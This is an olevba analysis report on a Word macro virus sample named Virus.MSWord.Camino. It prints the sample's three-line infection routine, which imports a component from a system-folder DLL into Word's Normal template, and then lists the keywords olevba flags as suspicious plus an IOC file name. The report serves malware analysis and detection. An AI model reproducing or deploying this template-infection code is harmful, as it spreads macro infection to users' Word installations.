olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Camino
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Camino 
in file: Virus.MSWord.Camino - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Set W = WScript.CreateObject("Word.Application")
W.NormalTemplate.VBProject.VBComponents.Import ("C:\WINNT\SYSTEM\Vc12.dll")
W.Application.Quit
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Vc12.dll            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

